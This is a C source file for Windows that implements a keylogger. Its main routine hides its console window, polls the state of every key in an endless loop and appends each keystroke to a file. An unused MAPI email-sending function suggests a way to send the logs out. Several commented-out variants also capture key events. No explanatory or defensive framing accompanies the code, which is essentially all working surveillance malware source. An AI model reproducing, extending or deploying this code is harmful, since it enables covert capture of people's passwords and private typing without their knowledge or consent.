#include <windows.h>
#include <mmsystem.h>
#include <mapi.h>
#include <stdio.h>


void send_email(char *recipient, char *subject, char *message) {
    MapiMessage email;
    memset(&email, 0, sizeof(MapiMessage));
    email.lpszSubject = subject;
    email.lpszNoteText = message;
    email.nRecipCount = 1;
    MapiRecipDesc recipient_desc;
    memset(&recipient_desc, 0, sizeof(MapiRecipDesc));
    recipient_desc.lpszName = recipient;
    recipient_desc.ulRecipClass = MAPI_TO;
    email.lpRecips = &recipient_desc;

    if (MAPISendMail(0, 0, &email, MAPI_LOGON_UI | MAPI_DIALOG, 0) != SUCCESS_SUCCESS) {
        printf("Error sending email.\n");
    }
}


void write_to_file(char character, char *filename) {
    FILE *fp;
    fp = fopen(filename, "a");
    if (fp == NULL) {
        printf("File couldn't be opened.\n");
        return;
    }
    fprintf(fp, "%c", character);
    fclose(fp);
}

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (1) {
        for (int i = 0; i < 256; i++) {
            short state = GetAsyncKeyState(i);
            if (state & 0x0001) {
                printf("Key event: %c\n", (char)i);
                write_to_file((char)i, "sample.txt");
            }
        }
    }

    return 0;
}



/*
#include <windows.h>
#include <tchar.h>

int _tmain(int argc, _TCHAR* argv[]) {
    while (1) {
        for (int i = 0; i < 256; i++) {
            short state = GetAsyncKeyState(i);
            if (state & 0x0001) {
                _tprintf(_T("Key event: %c\n"), (char)i);
            }
        }
    }

    return 0;
}
*/

/*
#include <windows.h>
#include <stdio.h>

int main() {
    INPUT_RECORD irInBuf[128];
    DWORD cNumRead;
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE)
        return 1;

    while (1) {
        if (!ReadConsoleInput(hStdin, irInBuf, 128, &cNumRead))
            return 1;

        for (DWORD i = 0; i < cNumRead; i++) {
            if (irInBuf[i].EventType == KEY_EVENT && irInBuf[i].Event.KeyEvent.bKeyDown) {
                printf("Key event: %c\n", irInBuf[i].Event.KeyEvent.uChar.AsciiChar);
            }
        }
    }

    return 0;
}
*/


/*
#include <windows.h>
#include <tchar.h>

int _tmain(int argc, _TCHAR* argv[]) {
    INPUT_RECORD irInBuf[128];
    DWORD cNumRead;
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE)
        return 1;

    while (1) {
        if (!ReadConsoleInput(hStdin, irInBuf, 128, &cNumRead))
            return 1;

        for (DWORD i = 0; i < cNumRead; i++) {
            if (irInBuf[i].EventType == KEY_EVENT && irInBuf[i].Event.KeyEvent.bKeyDown) {
                tprintf(_T("Key event: %c\n"), irInBuf[i].Event.KeyEvent.uChar.AsciiChar);
            }
        }
    }

    return 0;
}
*/